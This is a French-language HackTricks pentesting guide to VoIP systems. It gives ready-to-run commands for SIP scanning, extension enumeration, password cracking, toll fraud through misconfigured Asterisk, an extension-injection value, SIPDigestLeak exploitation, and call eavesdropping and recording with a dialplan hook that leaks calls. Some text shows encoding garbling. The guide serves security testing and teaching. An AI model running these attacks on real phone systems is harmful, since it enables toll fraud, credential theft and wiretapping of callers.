# Test d'intrusion VoIP

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base sur la VoIP

Pour commencer √† apprendre comment fonctionne la VoIP, consultez :

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Messages de base
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Codes de r√©ponse

**1xx‚ÄîR√©ponses provisoires**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîR√©ponses r√©ussies**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîR√©ponses de redirection**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîR√©ponses d'√©chec du client**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîR√©ponses d'√©chec du serveur**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîR√©ponses d'√©chec globales**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## √ânum√©ration VoIP

### Num√©ros de t√©l√©phone

Une des premi√®res √©tapes qu'une √©quipe Red pourrait faire est de rechercher les num√©ros de t√©l√©phone disponibles pour contacter l'entreprise en utilisant des outils OSINT, des recherches Google ou en grattant les pages web.

Une fois que vous avez les num√©ros de t√©l√©phone, vous pourriez utiliser des services en ligne pour identifier l'op√©rateur :

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Savoir si l'op√©rateur fournit des services VoIP pourrait vous permettre d'identifier si l'entreprise utilise la VoIP... De plus, il est possible que l'entreprise n'ait pas engag√© de services VoIP mais utilise des cartes PSTN pour connecter son propre PBX VoIP au r√©seau t√©l√©phonique traditionnel.

Des √©l√©ments tels que des r√©ponses automatis√©es de musique indiquent g√©n√©ralement que la VoIP est utilis√©e.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informations OSINT

Toute autre enumeration OSINT qui aide √† identifier le logiciel VoIP utilis√© sera utile pour une √âquipe Rouge.

### √ânum√©ration du r√©seau

* **`nmap`** est capable de scanner les services UDP, mais en raison du nombre de services UDP scann√©s, il est tr√®s lent et peut ne pas √™tre tr√®s pr√©cis avec ce type de services.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** de SIPVicious (`sudo apt install sipvicious`): Localisera les services SIP dans le r√©seau indiqu√©.
* `svmap` est **facile √† bloquer** car il utilise l'User-Agent `friendly-scanner`, mais vous pourriez modifier le code de `/usr/share/sipvicious/sipvicious` et le changer.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`Analyse SIPPTS`** de [**sippts**](https://github.com/Pepelux/sippts)**:** L'analyse SIPPTS est un scanner tr√®s rapide pour les services SIP sur UDP, TCP ou TLS. Il utilise le multithreading et peut balayer de larges plages de r√©seaux. Il permet d'indiquer facilement une plage de ports, de balayer √† la fois le TCP et l'UDP, d'utiliser une autre m√©thode (par d√©faut, il utilisera OPTIONS) et de sp√©cifier un User-Agent diff√©rent (et plus).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumeration de R√©seau Suppl√©mentaire

Le PBX pourrait √©galement exposer d'autres services r√©seau tels que :

- **69/UDP (TFTP)** : Mises √† jour du firmware
- **80 (HTTP) / 443 (HTTPS)** : Pour g√©rer le p√©riph√©rique depuis le web
- **389 (LDAP)** : Alternative pour stocker les informations des utilisateurs
- **3306 (MySQL)** : Base de donn√©es MySQL
- **5038 (Manager)** : Permet d'utiliser Asterisk depuis d'autres plateformes
- **5222 (XMPP)** : Messages utilisant Jabber
- **5432 (PostgreSQL)** : Base de donn√©es PostgreSQL
- Et d'autres...

### Enumeration des M√©thodes

Il est possible de trouver **quelles m√©thodes sont disponibles** √† utiliser dans le PBX en utilisant `SIPPTS enumerate` depuis [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analyse des r√©ponses du serveur

Il est tr√®s important d'analyser les en-t√™tes qu'un serveur nous renvoie, en fonction du type de message et des en-t√™tes que nous envoyons. Avec `SIPPTS send` de [**sippts**](https://github.com/Pepelux/sippts), nous pouvons envoyer des messages personnalis√©s, manipuler tous les en-t√™tes et analyser la r√©ponse.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Il est √©galement possible d'obtenir des donn√©es si le serveur utilise des websockets. Avec `SIPPTS wssend` de [**sippts**](https://github.com/Pepelux/sippts), nous pouvons envoyer des messages WS personnalis√©s.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### √ânum√©ration des extensions

Les extensions dans un syst√®me PBX (Private Branch Exchange) font r√©f√©rence aux **identifiants internes uniques attribu√©s √† des lignes t√©l√©phoniques individuelles**, des appareils ou des utilisateurs au sein d'une organisation ou d'une entreprise. Les extensions permettent de **routage des appels au sein de l'organisation de mani√®re efficace**, sans avoir besoin de num√©ros de t√©l√©phone externes individuels pour chaque utilisateur ou appareil.

* **`svwar`** de SIPVicious (`sudo apt install sipvicious`) : `svwar` est un scanner de lignes d'extension SIP PBX gratuit. En concept, il fonctionne de mani√®re similaire aux wardialers traditionnels en **devinant une plage d'extensions ou une liste donn√©e d'extensions**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS exten identifie les extensions sur un serveur SIP. Sipexten peut v√©rifier de larges plages de r√©seau et de ports.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Vous pouvez √©galement √©num√©rer les extensions/noms d'utilisateur avec metasploit :
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** est un **√©num√©rateur de force brute de noms d'utilisateur** pour le protocole Inter Asterisk Exchange. enumIAX peut fonctionner selon deux modes distincts : Deviner les noms d'utilisateur s√©quentiels ou Attaque par dictionnaire.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attaques VoIP

### Brute-Force de mot de passe - en ligne

Ayant d√©couvert le **PBX** et certains **extensions/noms d'utilisateur**, une √©quipe rouge pourrait essayer de **s'authentifier via la m√©thode `REGISTER`** √† une extension en utilisant un dictionnaire de mots de passe courants pour forcer l'authentification.

{% hint style="danger" %}
Notez qu'un **nom d'utilisateur** peut √™tre le m√™me que l'extension, mais cette pratique peut varier en fonction du syst√®me PBX, de sa configuration et des pr√©f√©rences de l'organisation...

Si le nom d'utilisateur n'est pas le m√™me que l'extension, vous devrez **d√©terminer le nom d'utilisateur pour le forcer**.
{% endhint %}

* **`svcrack`** de SIPVicious (`sudo apt install sipvicious`): SVCrack vous permet de cracker le mot de passe pour un nom d'utilisateur/extension sp√©cifique sur un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS rcrack est un outil de craquage de mot de passe √† distance pour les services SIP. Rcrack peut tester les mots de passe pour plusieurs utilisateurs dans diff√©rentes plages d'adresses IP et de ports.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Interception VoIP

Si vous trouvez un √©quipement VoIP √† l'int√©rieur d'un **r√©seau Wifi ouvert**, vous pourriez **intercepter toutes les informations**. De plus, si vous √™tes dans un r√©seau plus ferm√© (connect√© via Ethernet ou Wifi prot√©g√©), vous pourriez effectuer des attaques **MitM telles que** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) entre le **PBX et la passerelle** pour intercepter les informations.

Parmi les informations r√©seau, vous pourriez trouver des **identifiants web** pour g√©rer l'√©quipement, des **extensions d'utilisateur**, des **noms d'utilisateur**, des adresses **IP**, m√™me des **mots de passe hach√©s** et des **paquets RTP** que vous pourriez reproduire pour **√©couter la conversation**, et plus encore.

Pour obtenir ces informations, vous pourriez utiliser des outils tels que Wireshark, tcpdump... mais un **outil sp√©cialement cr√©√© pour intercepter les conversations VoIP est** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Notez que si **TLS est utilis√© dans la communication SIP**, vous ne pourrez pas voir la communication SIP en clair.\
Il en va de m√™me si **SRTP** et **ZRTP** sont utilis√©s, les **paquets RTP ne seront pas en clair**.
{% endhint %}

#### Identifiants SIP (Brute-Force de mot de passe - hors ligne)

[V√©rifiez cet exemple pour mieux comprendre une **communication SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) pour apprendre comment les **identifiants sont envoy√©s**.

* **`sipdump`** & **`sipcrack`,** faisant partie de **sipcrack** (`apt-get install sipcrack`): Ces outils peuvent **extraire** d'un **pcap** les **authentifications digest** dans le protocole SIP et les **forcer** avec une attaque brute force.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS dump peut extraire les authentifications digest d'un fichier pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS dcrack est un outil pour cracker les authentifications digest obtenues avec le dump SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** de [**sippts**](https://github.com/Pepelux/sippts)** :** SIPPTS tshark extrait les donn√©es du protocole SIP √† partir d'un fichier PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Codes DTMF

**Non seulement les identifiants SIP** peuvent √™tre trouv√©s dans le trafic r√©seau, il est √©galement possible de trouver des codes DTMF qui sont utilis√©s par exemple pour acc√©der √† la **messagerie vocale**.\
Il est possible d'envoyer ces codes dans des **messages SIP INFO**, en **audio** ou √† l'int√©rieur de **paquets RTP**. Si les codes se trouvent dans les paquets RTP, vous pourriez d√©couper cette partie de la conversation et utiliser l'outil multimo pour les extraire:
```bash
multimon -a DTMF -t wac pin.wav
```
### Appels gratuits / Mauvaises configurations de connexions Asterisks

Dans Asterisk, il est possible d'autoriser une connexion **√† partir d'une adresse IP sp√©cifique** ou de **n'importe quelle adresse IP** :
```
host=10.10.10.10
host=dynamic
```
Si une adresse IP est sp√©cifi√©e, l'h√¥te **n'aura pas besoin d'envoyer des requ√™tes REGISTER** de temps en temps (dans le paquet REGISTER est envoy√© le temps de vie, g√©n√©ralement 30 minutes, ce qui signifie que dans un autre sc√©nario, le t√©l√©phone devra s'enregistrer toutes les 30 minutes). Cependant, il devra avoir des ports ouverts permettant les connexions du serveur VoIP pour recevoir des appels.

Pour d√©finir les utilisateurs, ils peuvent √™tre d√©finis comme suit :

* **`type=user`** : L'utilisateur peut uniquement recevoir des appels en tant qu'utilisateur.
* **`type=friend`** : Il est possible d'effectuer des appels en tant que pair et de les recevoir en tant qu'utilisateur (utilis√© avec des extensions).
* **`type=peer`** : Il est possible d'envoyer et de recevoir des appels en tant que pair (trunks SIP).

Il est √©galement possible d'√©tablir une confiance avec la variable non s√©curis√©e :

* **`insecure=port`** : Autorise les connexions de pair valid√©es par IP.
* **`insecure=invite`** : Ne n√©cessite pas d'authentification pour les messages INVITE.
* **`insecure=port,invite`** : Les deux.

{% hint style="warning" %}
Lorsque **`type=friend`** est utilis√©, la **valeur** de la variable **host** ne sera pas utilis√©e, donc si un administrateur **configure incorrectement un SIP-trunk** en utilisant cette valeur, **n'importe qui pourra s'y connecter**.

Par exemple, cette configuration serait vuln√©rable :\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Appels gratuits / Mauvaises configurations de contexte Asterisk

Dans Asterisk, un **contexte** est un conteneur ou une section nomm√©(e) dans le plan de num√©rotation qui **regroupe les extensions, actions et r√®gles** connexes. Le plan de num√©rotation est le composant central d'un syst√®me Asterisk, car il d√©finit **comment les appels entrants et sortants sont g√©r√©s et rout√©s**. Les contextes sont utilis√©s pour organiser le plan de num√©rotation, g√©rer le contr√¥le d'acc√®s et fournir une s√©paration entre les diff√©rentes parties du syst√®me.

Chaque contexte est d√©fini dans le fichier de configuration, g√©n√©ralement dans le fichier **`extensions.conf`**. Les contextes sont indiqu√©s par des crochets, avec le nom du contexte inclus √† l'int√©rieur. Par exemple :
```bash
csharpCopy code[my_context]
```
√Ä l'int√©rieur du contexte, vous d√©finissez des extensions (mod√®les de num√©ros compos√©s) et les associez √† une s√©rie d'actions ou d'applications. Ces actions d√©terminent comment l'appel est trait√©. Par exemple :
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Cet exemple montre un contexte simple appel√© "mon\_contexte" avec une extension "100". Lorsque quelqu'un compose le 100, l'appel sera r√©pondu, un message de bienvenue sera lu, puis l'appel sera termin√©.

Il s'agit **d'un autre contexte** qui permet de **composer n'importe quel autre num√©ro**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Si l'administrateur d√©finit le **contexte par d√©faut** comme suit :
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
N'importe qui pourra utiliser le **serveur pour appeler n'importe quel autre num√©ro** (et l'administrateur du serveur paiera l'appel).
{% endhint %}

{% hint style="danger" %}
De plus, par d√©faut, le fichier **`sip.conf`** contient **`allowguest=true`**, donc **n'importe quel** attaquant sans **authentification** pourra appeler n'importe quel autre num√©ro.
{% endhint %}

*   **`SIPPTS invite`** de [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite v√©rifie si un **serveur PBX nous permet de passer des appels sans authentification**. Si le serveur SIP a une configuration incorrecte, il nous permettra de passer des appels vers des num√©ros externes. Il peut √©galement nous permettre de transf√©rer l'appel vers un deuxi√®me num√©ro externe.

Par exemple, si votre serveur Asterisk a une mauvaise configuration de contexte, vous pouvez accepter une demande INVITE sans autorisation. Dans ce cas, un attaquant peut passer des appels sans conna√Ætre d'utilisateur/mot de passe.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Appels gratuits / IVRS mal configur√©

IVRS signifie **Interactive Voice Response System**, une technologie de t√©l√©phonie qui permet aux utilisateurs d'interagir avec un syst√®me informatis√© via la voix ou des touches. L'IVRS est utilis√© pour cr√©er des syst√®mes de **gestion des appels automatis√©s** qui offrent toute une gamme de fonctionnalit√©s, telles que la fourniture d'informations, la redirection des appels et la collecte des saisies des utilisateurs.

L'IVRS dans les syst√®mes VoIP se compose g√©n√©ralement de :

1. **Messages vocaux**: Messages audio pr√©enregistr√©s qui guident les utilisateurs √† travers les options de menu IVR et les instructions.
2. **Signalisation DTMF** (Dual-Tone Multi-Frequency) : Saisies de touches g√©n√©r√©es en appuyant sur les touches du t√©l√©phone, qui sont utilis√©es pour naviguer √† travers les menus IVR et fournir des saisies.
3. **Routage des appels**: Diriger les appels vers la destination appropri√©e, tels que des d√©partements sp√©cifiques, des agents ou des extensions en fonction des saisies des utilisateurs.
4. **Collecte des saisies des utilisateurs**: Collecte d'informations aupr√®s des appelants, telles que des num√©ros de compte, des identifiants de cas ou d'autres donn√©es pertinentes.
5. **Int√©gration avec des syst√®mes externes**: Connecter le syst√®me IVR √† des bases de donn√©es ou d'autres syst√®mes logiciels pour acc√©der ou mettre √† jour des informations, effectuer des actions ou d√©clencher des √©v√©nements.

Dans un syst√®me VoIP Asterisk, vous pouvez cr√©er un IVR en utilisant le plan de num√©rotation (fichier **`extensions.conf`**) et diverses applications telles que `Background()`, `Playback()`, `Read()`, et plus encore. Ces applications vous aident √† diffuser des messages vocaux, capturer les saisies des utilisateurs et contr√¥ler le flux d'appels.

#### Exemple de configuration vuln√©rable
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Le pr√©c√©dent est un exemple o√π l'utilisateur est invit√© √† **appuyer sur 1 pour appeler** un service, **2 pour appeler** un autre, ou **l'extension compl√®te** s'il la conna√Æt.\
La vuln√©rabilit√© r√©side dans le fait que la **longueur de l'extension indiqu√©e n'est pas v√©rifi√©e, donc un utilisateur pourrait saisir un num√©ro complet pendant le d√©lai de 5 secondes et il sera appel√©.**

### Injection d'extension

Utiliser une extension telle que :
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Lorsque **`${EXTEN}`** est l'**extension** qui sera appel√©e, lorsque l'**ext 101 est introduit**, voici ce qui se passerait :
```scss
exten => 101,1,Dial(SIP/101)
```
Cependant, si **`${EXTEN}`** permet d'introduire **plus que des chiffres** (comme dans les anciennes versions d'Asterisk), un attaquant pourrait introduire **`101&SIP123123123`** pour appeler le num√©ro de t√©l√©phone 123123123. Et voici ce que cela donnerait :
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Par cons√©quent, un appel √† l'extension **`101`** et **`123123123`** sera envoy√© et seul le premier √† recevoir l'appel serait √©tabli... mais si un attaquant utilise une **extension qui contourne toute correspondance** qui est en cours d'ex√©cution mais n'existe pas, il pourrait **injecter un appel uniquement vers le num√©ro d√©sir√©**.

## Vuln√©rabilit√© SIPDigestLeak

La fuite de Digest SIP est une vuln√©rabilit√© qui affecte un grand nombre de t√©l√©phones SIP, y compris les t√©l√©phones IP mat√©riels et logiciels ainsi que les adaptateurs t√©l√©phoniques (VoIP vers analogique). La vuln√©rabilit√© permet la **fuite de la r√©ponse d'authentification Digest**, qui est calcul√©e √† partir du mot de passe. Une **attaque de mot de passe hors ligne est alors possible** et peut r√©cup√©rer la plupart des mots de passe bas√©s sur la r√©ponse au d√©fi.

**[Sc√©nario de vuln√©rabilit√© √† partir d'ici**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un t√©l√©phone IP (victime) √©coute sur n'importe quel port (par exemple : 5060), acceptant les appels t√©l√©phoniques
2. L'attaquant envoie un INVITE au t√©l√©phone IP
3. Le t√©l√©phone de la victime commence √† sonner et quelqu'un d√©croche et raccroche (car personne ne r√©pond au t√©l√©phone √† l'autre bout)
4. Lorsque le t√©l√©phone est raccroch√©, le **t√©l√©phone de la victime envoie un BYE √† l'attaquant**
5. L'**attaquant √©met une r√©ponse 407** qui **demande une authentification** et √©met un d√©fi d'authentification
6. Le **t√©l√©phone de la victime fournit une r√©ponse au d√©fi d'authentification** dans un second BYE
7. L'**attaquant peut alors lancer une attaque par force brute** sur la r√©ponse au d√©fi sur sa machine locale (ou r√©seau distribu√©, etc.) et deviner le mot de passe

* **Fuite SIPPTS** de [**sippts**](https://github.com/Pepelux/sippts)**:** La fuite SIPPTS exploite la vuln√©rabilit√© de fuite de Digest SIP qui affecte un grand nombre de t√©l√©phones SIP. La sortie peut √™tre enregistr√©e au format SipCrack pour la forcer en utilisant SIPPTS dcrack ou l'outil SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call permet √† un **utilisateur web** (qui pourrait par exemple √™tre int√©ress√© par un produit) d'**introduire** son **num√©ro de t√©l√©phone** pour √™tre rappel√©. Ensuite, un appel commercial sera effectu√©, et lorsque l'utilisateur **d√©croche le t√©l√©phone**, il sera **appel√© et connect√© √† l'agent**.

Un profil Asterisk courant pour cela est :
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Le profil pr√©c√©dent permet √† **N'IMPORTE QUELLE adresse IP de se connecter** (si le mot de passe est connu).
* Pour **organiser un appel**, comme sp√©cifi√© pr√©c√©demment, **aucune permission de lecture n'est n√©cessaire** et seulement **l'autorisation d'**origine** en **√©criture** est requise.

Avec ces autorisations, n'importe quelle adresse IP connaissant le mot de passe pourrait se connecter et extraire trop d'informations, comme :
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Plus d'informations ou d'actions pourraient √™tre demand√©es.**

### **√âcoute clandestine**

Dans Asterisk, il est possible d'utiliser la commande **`ChanSpy`** en indiquant les **extensions √† surveiller** (ou toutes) pour √©couter les conversations en cours. Cette commande doit √™tre attribu√©e √† une extension.

Par exemple, **`exten => 333,1,ChanSpy('all',qb)`** indique que si vous **appelez** l'**extension 333**, elle **surveillera** **`toutes`** les extensions, **commencera √† √©couter** d√®s qu'une nouvelle conversation commence (**`b`**) en mode silencieux (**`q`**) car nous ne voulons pas y interagir. Vous pouvez passer d'une conversation √† une autre en appuyant sur **`*`**, ou en marquant le num√©ro de l'extension.

Il est √©galement possible d'utiliser **`ExtenSpy`** pour surveiller une seule extension.

Au lieu d'√©couter les conversations, il est possible de les **enregistrer dans des fichiers** en utilisant une extension telle que :
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Les appels seront enregistr√©s dans **`/tmp`**.

Vous pourriez m√™me faire en sorte qu'Asterisk **ex√©cute un script qui divulguera l'appel** lorsqu'il est ferm√©.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vuln√©rabilit√© RTCPBleed

**RTCPBleed** est un probl√®me de s√©curit√© majeur affectant les serveurs VoIP bas√©s sur Asterisk (publi√© en 2017). La vuln√©rabilit√© permet au trafic **RTP (Real Time Protocol)**, qui transporte les conversations VoIP, d'√™tre **intercept√© et redirig√© par n'importe qui sur Internet**. Cela se produit car le trafic RTP contourne l'authentification lorsqu'il traverse les pare-feu NAT (Network Address Translation).

Les proxies RTP tentent de r√©soudre les **limitations des NAT** affectant les syst√®mes RTC en faisant transiter les flux RTP entre deux parties ou plus. Lorsque le NAT est en place, le logiciel de proxy RTP ne peut souvent pas se fier aux informations d'IP et de port RTP r√©cup√©r√©es via la signalisation (par exemple SIP). Par cons√©quent, un certain nombre de proxies RTP ont mis en ≈ìuvre un m√©canisme o√π ce **couple IP et port est appris automatiquement**. Cela est souvent fait en inspectant le trafic RTP entrant et en marquant l'IP et le port source pour tout trafic RTP entrant comme celui auquel il convient de r√©pondre. Ce m√©canisme, qui peut √™tre appel√© "mode d'apprentissage", **n'utilise aucun type d'authentification**. Par cons√©quent, les **attaquants** peuvent **envoyer du trafic RTP au proxy RTP** et recevoir le trafic RTP relay√© destin√© √† l'appelant ou au destinataire d'un flux RTP en cours. Nous appelons cette vuln√©rabilit√© RTP Bleed car elle permet aux attaquants de recevoir des flux m√©dia RTP destin√©s √† √™tre envoy√©s √† des utilisateurs l√©gitimes.

